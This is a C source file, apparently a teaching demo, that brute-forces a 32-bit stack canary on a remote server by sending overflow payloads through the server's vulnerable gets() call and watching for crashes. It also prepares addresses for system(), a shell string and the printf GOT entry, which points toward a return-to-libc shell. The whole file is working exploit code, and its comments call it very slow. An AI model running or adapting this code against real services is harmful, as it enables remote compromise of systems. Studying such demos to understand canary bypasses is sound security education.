/***********************************************************************
				Brute-forcing Attack under ASLR and stack canaries
	A demo used to guess stack canaries.
	Admittedly, very slow. Not a feasible attack vector here.
	Refer to brute_force_canary() for more information.	

	sheisc@163.com
************************************************************************/

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h> 
#include <signal.h>
#include "util.h"
#include <netinet/tcp.h>
#define		REPEAT_TIMES		5
static int crash = 0;


struct canary_info{
	unsigned int canary;	
}c_info;

static struct server_info s_info = {
	.system_func_addr = SYSTEM_FUNC_ADDR,
	.shell_str_addr = SHELL_STR_ADDR,
	.printf_got_addr = PRINTF_GOT_ADDR,
	.stack_lifting = STACK_LIFTING_CNT,
	.printf_func_addr = PRINTF_FUNC_ADDR,
};

static void crash_sig_handler(int sig){
	//crash = 1;
	//printf("The remote server suffers from %d crash: sig %d \n",crash,sig);
}

static void guess_canary(int sock,struct canary_info * csi){
	char buf[TARGET_BUF_SIZE];
	int n,i;
	memset(buf, 'x', CANARY_POSITION);
	// FIXME:	suppose the server is little-endian	
	*((unsigned int*)(buf+CANARY_POSITION)) = csi->canary;
	
	buf[CANARY_POSITION + sizeof(csi->canary)] = '\n';
	
	// First packet should be handled correctly.
	send( sock, buf, CANARY_POSITION + sizeof(csi->canary) + 1, 0);	
	recv(sock, buf, sizeof(buf), 0);
	
	// If the server crashes, we will get a signal in crash_sig_handler().
	buf[0] = '\n';
	for(i = 0; i < REPEAT_TIMES; i++){
		send(sock, buf, 1, 0);
		n = recv(sock, buf, sizeof(buf),  0);
		if(n < 0){
			crash = 1;
			break;
			//printf("recv() return %d \n",n);
		}

	}
}

static void canary_request(int sock){	
	signal(SIGPIPE,crash_sig_handler);	
	guess_canary(sock,&c_info);
	//printf("canary is %08x \n",*((unsigned int*)c_info.can_bytes));

}
/**	
	(1) Since the vulnerable gets() on the server always adds a NULL at the end,
	if we brute-force the stack canary byte after byte, the NULL will corrupt the upper bytes 
	of canary and trigger a crash even when the lower bytes we guess are right.		
	(2) It seems that the least significant byte of stack canary is always 0x00 on Ubuntu 12.04.
	So the good news here is that we only need to guess the upper 3 bytes.
	To avoid the problem mentioned above, we guess these 3 bytes together. Of course, it is much slower.	
 */
static unsigned int brute_force_canary(int argc, char **argv,struct canary_info * csi){
	unsigned int val;	
	// csi->canary = 0x1b4b9b00;
	for(val = 0x000000; val <= 0xFFFFFF; val++){
		crash = 0;	
		csi->canary = val << 8;	
		//printf("Try canary 0x%08x \n",csi->canary);
		if(val % 0x10 == 0){
			printf("Try canary 0x%08x \n",csi->canary);
		}
		do_it(argc,argv,canary_request);	
		if(!crash){
			printf("Got it. Stack canary is 0x%08x.\n",csi->canary);
			return csi->canary;
		}	
	}	


	return -1;
}



int main(int argc, char **argv){
	s_info.canary =  brute_force_canary(argc, argv,&c_info);
	return 0;
}

